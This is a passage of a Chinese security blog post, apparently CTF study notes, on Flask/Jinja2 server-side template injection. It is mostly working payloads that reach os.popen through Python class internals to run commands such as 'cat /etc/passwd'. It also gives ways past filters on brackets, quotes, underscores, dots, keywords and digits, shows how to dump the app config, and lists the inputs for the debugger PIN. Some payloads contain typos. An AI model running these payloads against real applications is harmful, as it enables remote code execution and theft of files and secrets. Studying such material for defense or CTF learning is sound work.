+__base__             	类型对象的直接基类
+__bases__            	类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
+__mro__              	此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
+__subclasses__()     	返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method 							returns a list of all those references still alive. The list is in definition order.
+
+__init__             	初始化类，返回的类型是function
+__globals__          	使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
+__dic__              	类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
+__getattribute__()   	实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx&#x2F;a.xxx()），都会自动						  去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
+
+__getitem__()        	调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
+__builtins__         	内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多						  常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
+
+__import__           	动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
+__str__()            	返回描写这个对象的字符串，可以理解成就是打印出来。
+url_for              	flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
+get_flashed_messages 	flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
+lipsum               	flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：   													 &#123;&#123;lipsum.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;
+
+current_app          	应用上下文，一个全局变量。
+
+request              	可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函 														 数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;&#x2F;proc\self\fd&#x2F;3&#39;).read()
+
+request.args.x1   	 	get传参
+request.values.x1 	 	所有参数
+request.cookies      	cookies参数
+request.headers      	请求头参数
+request.form.x1   	 	post传参	(Content-Type:applicaation&#x2F;x-www-form-urlencoded或multipart&#x2F;form-data)
+request.data  		 	post传参	(Content-Type:a&#x2F;b)
+request.json		 	post传json  (Content-Type: application&#x2F;json)
+config               	当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read() 						 &#125;&#125;
+g                    	&#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>常用过滤器：</p>
+<pre class="line-numbers language-none"><code class="language-none">int()：			将值转换为int类型；
+
+float()：		将值转换为float类型；
+
+lower()：		将字符串转换为小写；
+
+upper()：		将字符串转换为大写；
+
+title()：		把值中的每个单词的首字母都转成大写；
+
+capitalize()：	把变量值的首字母转成大写，其余字母转小写；
+
+trim()：			截取字符串前面和后面的空白字符；
+
+wordcount()：	计算一个长字符串中单词的个数；
+
+reverse()：		字符串反转；
+
+replace(value,old,new)： 替换将old替换为new的字符串；
+
+truncate(value,length&#x3D;255,killwords&#x3D;False)：截取length长度的字符串；
+
+striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；
+
+escape()或e：	转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。
+
+safe()： 	禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#39;&lt;em&gt;hello&lt;&#x2F;em&gt;&#39;|safe&#125;&#125;；
+
+list()：		将变量列成列表；
+
+string()：	将变量转换成字符串；
+
+join()：		将一个序列中的参数值拼接成字符串。示例看上面payload；
+
+abs()：		返回一个数值的绝对值；
+
+first()：	返回一个序列的第一个元素；
+
+last()：		返回一个序列的最后一个元素；
+
+format(value,arags,*kwargs)： 格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#39;Hello?&#39;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!
+
+length()： 	返回一个序列或者字典的长度；
+
+sum()： 		返回列表内数值的和；
+
+sort()： 	返回排序后的列表；
+
+default(value,default_value,boolean&#x3D;false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，											  则会使用xiaotuo来替代。boolean&#x3D;False默认是在只有这个变量为undefined的时候才会使用default中的											  值，如果想使用python的形式判断是否为false，则可以传递boolean&#x3D;true。也可以使用or来替换。
+
+length() 	返回字符串的长度，别名是count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="常用注入模块详解"><a href="#常用注入模块详解" class="headerlink" title="常用注入模块详解"></a>常用注入模块详解</h4><p>可用的注入模块：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%948.png"
+                     
+                ></p>
+<p>在这些模块中存在可以查看文件和命令执行的方法。</p>
+<p>常见方法快速查找表：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%9410.png"
+                     
+                ></p>
+<h5 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h5><p>查找子类<code>_frozen_importib_external.Filel oader</code><br><code>&lt;class &#39; frozen_ jimportlib_ external.FileLoader&#39;&gt;</code></p>
+<p>可用有如下脚本：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%949.png"
+                     
+                ></p>
+<p>通过此脚本可以快速查看我们目标方法所在位置。</p>
+<h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><h5 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h5><p>内建函数：在python执行脚本时自动加载的函数，python脚本查看可利用eval命令执行。</p>
+<h5 id="os模块直接执行命令"><a href="#os模块直接执行命令" class="headerlink" title="os模块直接执行命令"></a>os模块直接执行命令</h5><p>在其他函数中执行os命令</p>
+<h5 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h5><p>可以载第三方库，使用load_module加载us</p>
+<h5 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h5><p>从python2.4版本开始，可以用subprocess这个模块来产生子进程，并连接到子进程的</p>
+<p>输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。</p>
+<p>subprocess意在替代其他几个老的模块或者函数，比如: os.system、 os.popen 等函数。</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;[].__ class__,__base__,__subclasses__()[200](&#39;ls &#x2F;&#39;,shell&#x3D;True.stdout&#x3D;-1).communicate()[O].strip()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="常见的过滤与绕过"><a href="#常见的过滤与绕过" class="headerlink" title="常见的过滤与绕过"></a>常见的过滤与绕过</h4><h5 id="过滤绕过大括号"><a href="#过滤绕过大括号" class="headerlink" title="过滤绕过大括号"></a>过滤绕过大括号</h5><p>这里是指：<code>&#123;&#123;&#125;&#125;</code>这种双重大括号被过滤，并不是指大括号被完全过滤。</p>
+<p><code>&#123;%%&#125;</code>的使用介绍：这个符号是属于flask的控制语句，且以<code>&#123;%end...%&#125;</code>结尾，可以通过控制语句定义变量写循环，判断。用法如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;% if 2&gt;1 %&#125;abc&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这段代码的意思假如<code>2&gt;1</code>,则会输出中间的abc然后结束，这个大概的用法就是假如前边的判断为真，则输出中间的字符，我们可以用这个简单的代码来判断这个符号是否被过滤。</p>
+<p>假设这个符号没有被过滤，我们便可以用以下代码来进行命令执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;%printf(&quot;&quot;.__class__.__base__.__subclasses__()[目标方法所在子类的位次].__init__.__globals__[&quot;popen&quot;](&quot;cat &#x2F;etc&#x2F;passwd&quot;.read()))%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>正常情况下不会将结果回显出来，于是我们用print将其输出出来。</p>
+<h5 id="getitem绕过中括号过滤"><a href="#getitem绕过中括号过滤" class="headerlink" title="getitem绕过中括号过滤"></a>getitem绕过中括号过滤</h5><p><code>__getitem__</code>魔术方法：getitem()是python中的一个魔术方法，对字典使用时，传入字符串，返回字典相对应键所对应的值；对列表使用时，传入整数返回列表对应索引的值。</p>
+<p>通过这个方法我们可以绕过中括号，以课程中给的靶场为例，我们正常输入会回显内容，但我们输入中括号，就会被过滤：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7.png"
+                      alt="正常回显"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E4%B8%AD%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A41.png"
+                      alt="过滤"
+                ></p>
+<p>这种时候我们之际用getitem方法替换中括号即可。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B72.png"
+                      alt="绕过"
+                ></p>
+<p>接下来正常执行就行。</p>
+<h5 id="单双引号过滤和绕过"><a href="#单双引号过滤和绕过" class="headerlink" title="单双引号过滤和绕过"></a>单双引号过滤和绕过</h5><p><code>request</code>；他可以在flask中可以访问基于http请求传递的所有信息，此处的request并非python中的包，而是在flask内部的函数。</p>
+<p>以下是常见的方法：</p>
+<pre class="line-numbers language-none"><code class="language-none">request.args.key   获取get传入得key的值
+request.valuse.x1  所有参数
+request.cookies    获取cookie传入的参数
+request.headers    获取请求头请求参数
+request.from.key   获取post传入的参数
+request.data       获取post传入的参数（Content-Type:a&#x2F;b）
+request.json       获取post传入的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以视频中的靶场为例：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B71.png"
+                     
+                ></p>
+<p>构造的payload当中有单双引号存在时，就会被过滤，但假如我们利用request，就可以成功绕过，以<code>request.args.key</code>为例：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E8%BF%87%E6%BB%A4%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B72.png"
+                     
+                ></p>
+<p>这样，我们就可以从get传参中得到我们想要的值。其他的方式于上边演示的方法类似。</p>
+<h5 id="过滤器绕过下划线"><a href="#过滤器绕过下划线" class="headerlink" title="过滤器绕过下划线"></a>过滤器绕过下划线</h5><p>过滤器：过滤器通过管道符<code>|</code>与变量连接，并且在括号中可能有可选参数。</p>
+<p>flask常见过滤器：</p>
+<pre class="line-numbers language-none"><code class="language-none">length()				获取应该学列或者字典的长度并将其返回；
+int()					将值转换为int型
+float()					将值转换为float型
+lower()					将字符串转换为小写
+upper()					将字符串转化为大写
+reverse()				反转字符串
+replace(value,old,new)	将value中的old替换为new
+list()					将变量转换为列表类型；
+string()				将变量转换为字符串类型的
+join()					将一个序列中的参数值拼接成字符串，通常有python内置的dict()配合使用；
+attr()					获取对象的属性<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这些都可以在特殊过滤上使用，单比较常用的是<code>attr()</code>，用法如下：</p>
+<ul>
+<li><p>使用request</p>
+<p><code>&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</code>&#x3D;<code>&#123;&#123;[]|attr(request.args.class)|attr(request.args.base)|attr(request.args.sub)()&#125;&#125;</code></p>
+<p>此处需注意，subclasses__()中的这个括号要写在attr()这个后边，不能直接写在括号里</p>
+</li>
+<li><p>unicode编码绕过，这种方法就是将<code>__class__</code>等代码全部进行编码，再填入attr()括号中，如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;&#39;&#39;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(199)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;
+这段代码解码出来为：
+&#123;&#123;&#39;&#39;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getiitem__&quot;)(199)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;ls&quot;)|attr(&quot;read&quot;)()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>这样也能绕过</p>
+</li>
+<li><p>十六位编码绕过：这个与上边的unicode编码差不多，也是将中间的内容进行编码之后再写入，也能成功绕过。</p>
+</li>
+<li><p>base64编码绕过，与上边大差不差，不同点在于编码之后要解码，如：<code>attr(&quot;__class__&quot;)</code>&#x3D;<code>attr(&#39;X19jbGFzc19f&#39;.decode(&#39;base64&#39;))</code>,不适用于python3。</p>
+</li>
+<li><p>格式化字符串：%c%(95)就是下划线，将下划线替代之后即可，如下：attr(“%c%cclass%c%c”%(95,95,95,95))</p>
+</li>
+</ul>
+<h5 id="点的过滤和绕过"><a href="#点的过滤和绕过" class="headerlink" title="点的过滤和绕过"></a>点的过滤和绕过</h5><p>点过滤，就是:<code>.</code>被过滤，同样可以拿attr绕过，但太麻烦，也可以直接用<code>[]</code>替代点，如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;&#39;&#39;[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclass__&#39;]()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h5><ul>
+<li><p>编码绕过：在上边下划线绕过有讲，可以进行unicode、base64、十六位编码，都能绕过，注意：base64编码需要解码。</p>
+</li>
+<li><p>简单拼接：使用<code>+</code>号将关键字拆分为几段再拼接起来，如’cl’+’ass’&#x3D;’class’</p>
+</li>
+<li><p>jinjia2模板中的<code>~</code>:<code>&#123;%set a="__cla"%&#125;&#123; %set b= &quot;ss__&quot;%&#125;&#123;a~b&#125;</code></p>
+</li>
+<li><p>使用过滤器（rever反转、replace替换、join拼接等）：<code>&#123;%set a="_ ssalc__ "Ireverse%&#125;&#123;&#123;a&#125;&#125;</code></p>
+<p>如下图： </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4.png"
+                     
+                ></p>
+</li>
+<li><p>利用python的char():<br><code>&#123;%sett chr=url_for.__globals__['__builtins__'].chr%&#125;&#123;&#123;""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97 )%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</code></p>
+</li>
+</ul>
+<h5 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h5><ul>
+<li><p>length会回显出字符串的长度，并且可以加减乘，于是在数字被过滤的时候我们可以用这种方法来绕过这种过滤，如下，现假设我们要访问199位次的方法:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;%set &#39;aaaaaaaaaaaaaaaaaaa&#39;|length*&#39;aaaaaaaaaa&#39;|length+&#39;aaaaaaaaa&#39;|length&#125;&#123;&#123;&#39;&#39;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag&#39;).read()&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>像这样，我们便可以成功绕过数字。</p>
+</li>
+<li><p>数字过滤还有可以用全角数字绕过：<code>１２３４５６７８９０</code>用这样的数字去替换原本的数字。</p>
+</li>
+<li><p>还可以用count，如：</p>
+<pre class="line-numbers language-none"><code class="language-none">&#123;%set a&#x3D;dict(aaaaaaa&#x3D;x)|join|count%&#125;&#123;&#123;a&#125;&#125;
+#会输出7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
+</ul>
+<h5 id="获取config文件"><a href="#获取config文件" class="headerlink" title="获取config文件"></a>获取config文件</h5><p>在部分情况时，flag会藏在这个文件中，假如在没有过滤得情况下，我们可以直接用直接读取文件，但假若他存在过滤的话，我们就需要用其他的方法对她进行读取。</p>
+<p>flask内置函数：</p>
+<pre class="line-numbers language-none"><code class="language-none">lipsum		可加载第三方库
+urk_for		可返回url路径
+get_flashed_message 可获取信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>flask内置对象：可利用已加载内置函数或对象，可利用内置函数调用current_app模块进而查看配置文件</p>
+<pre class="line-numbers language-none"><code class="language-none">cycler
+joiner
+namespace
+config
+request
+session<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;
+&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;
+这两条代码都是获取当前程序下的config文件。也就是flask的config文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h5 id="混合过滤"><a href="#混合过滤" class="headerlink" title="混合过滤"></a>混合过滤</h5><p>获取符号：</p>
+<p>当符号被过滤时，我们不但可以利用编码绕过，还可以利用flask内置函数和对象获取符号；</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E2%80%94%E7%BB%BC%E5%90%88%E8%BF%87%E6%BB%A41.png"
+                     
+                ></p>
+<p>特点二：在部分情况回过滤下滑线和数字，那么<code>__getitem__</code>便无法使用，这时，我们可以用<code>pop</code>方法来替代此方法。</p>
+<h4 id="无回现ssti"><a href="#无回现ssti" class="headerlink" title="无回现ssti"></a>无回现ssti</h4><p>与无回现rce一样主要方法就，反弹shell，带外，盲注。用几道题来演示一下几种方法</p>
+<h2 id="debug-pin码计算"><a href="#debug-pin码计算" class="headerlink" title="debug pin码计算"></a>debug pin码计算</h2><p>pin码：对于有文件包含和文件读取的漏洞，且开启debug功能想要执行执行指令还需输入pin码，输入pin码之后可以输入命令值执行</p>
+<p><strong>pin码的生成原理</strong></p>
+<p>pin码主要有六个参数构成</p>
+<pre class="line-numbers language-none"><code class="language-none">username    执行代码时候的用户名
+getattr(app,&quot;__name__&quot;,app.__class__.__name__)通常为默认值 Flask
+modname  默认值flask.app
+getattr(mod,&quot;__file__&quot;,None)  app.py所在文件路径
+str(uuid.getnode())  电脑上mac地址
+get_machine_id()  根据操作系统不同，有四种获取方式。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取当前用户名：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> getpass
+username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>获取app对象module属性：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">import</span> typing <span class="token keyword">as</span> t
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span><span class="token string">"__module__"</span><span class="token punctuation">,</span>t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
+mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>mod<span class="token punctuation">)</span>
+<span class="token comment">#测试回显：&lt;module 'flask.app' from '/opt/flask1/lib/python3.11/site-packages/flask/app.py'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取mod的<code>__file__</code>属性，app.py文件所在位置：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+<span class="token keyword">import</span> typing <span class="token keyword">as</span> t
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span><span class="token string">"__module__"</span><span class="token punctuation">,</span>t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>
+mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span><span class="token string">"__file__"</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#测试结果：/opt/flask1/lib/python3.11/site-packages/flask/app.py</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>获取uuid，实际上就是当前网卡的物理地址的整型</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> uuid
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p><strong>实操获取数据过程</strong></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> ssti模板注入</li>
+        <li><strong>Author:</strong> 阿巴</li>
+        <li><strong>Created at:</strong> 2023-08-09 19:46:00</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-08-09 19:57:41
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2023/08/09/SSTI模板注入/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web%E5%AE%89%E5%85%A8/">#web安全</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/08/03/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%89/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">外部实体注入攻击（XXE）</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">ssti模板注入</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-text">SSTI模板注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-text">flask基本介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask%E7%9A%84%E5%8F%98%E9%87%8F%E4%B8%8E%E6%96%B9%E6%B3%95"><span class="nav-text">flask的变量与方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E6%A8%A1%E6%9D%BF%E4%BB%8B%E7%BB%8D"><span class="nav-text">flask模板介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="nav-text">模板注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#flask%E6%BC%8F%E6%B4%9E"><span class="nav-text">flask漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A4%E6%96%AD"><span class="nav-text">漏洞的判断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">继承关系和魔术方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" 